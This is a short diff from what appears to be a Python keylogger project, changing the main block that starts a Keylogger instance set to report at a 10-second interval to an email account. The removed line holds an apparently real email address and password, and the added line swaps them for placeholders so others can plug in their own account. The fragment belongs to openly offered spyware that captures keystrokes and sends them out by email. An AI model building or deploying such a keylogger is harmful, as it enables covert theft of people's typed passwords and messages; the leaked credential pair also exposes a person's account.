@@ -85,7 +85,7 @@ class Keylogger:
             keyboard_listener.join()
 if __name__ == '__main__':
     try:
-        my_keylogger = Keylogger(10, "sendtorohanvj@gmail.com", "Rohan@123")
+        my_keylogger = Keylogger(10, "YOUR EMAIL ID", "EMAIL PASSWORD")
         my_keylogger.start()
     except Exception:
         sys.exit()
